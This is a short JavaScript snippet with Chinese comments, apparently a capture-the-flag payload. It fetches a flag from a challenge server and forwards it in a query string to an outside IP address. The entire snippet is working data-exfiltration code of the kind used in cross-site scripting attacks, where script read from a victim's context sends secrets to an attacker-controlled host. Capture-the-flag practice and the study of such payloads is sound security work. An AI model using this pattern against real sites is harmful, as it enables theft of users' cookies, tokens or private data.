// 使用Fetch API获取flag
fetch('http://0192d6195b487e0081653d554fb15cbc.49rp.dg03.ciihw.cn:44990/flag')
  .then(response => response.text())
  .then(flag => {
    // 将获取到的flag作为参数发送到指定的服务器
    fetch(`http://101.43.121.110?flag=${encodeURIComponent(flag)}`);
  })
  .catch(error => console.error('Error fetching flag:', error));
